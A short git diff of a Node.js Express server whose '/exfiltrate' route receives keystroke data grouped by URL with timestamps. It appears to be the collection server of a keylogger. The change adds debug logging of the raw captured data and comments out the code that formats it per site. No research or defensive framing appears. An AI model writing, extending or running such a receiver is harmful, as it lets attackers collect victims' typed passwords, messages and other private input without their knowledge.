@@ -48,14 +48,17 @@ app.post('/exfiltrate', (req, res) => {
 
         case 'keys':
             let output = "";
+            console.log(Object.entries(data));
+            console.log("Raw data received:");
 
-            for (const [url, entries] of Object.entries(data)) {
-                output += `${url}:\n`;
-                entries.forEach(entry => {
-                    output += `[${entry.timestamp}] ${entry.text}\n`;
-                });
-                output += "\n"; // Add space between different URLs
-            }
+            // for (const [url, entries] of Object.entries(data)) {
+            //     console.log("print:", url, entries);
+            //     // output += `${url}:\n`;
+            //     // entries.forEach(entry => {
+            //     //     output += `[${entry.timestamp}] ${entry.text}\n`;
+            //     // });
+            //     // output += "\n"; // Add space between different URLs
+            // }
 
             console.log(output); // Output the formatted keystroke data
             break;
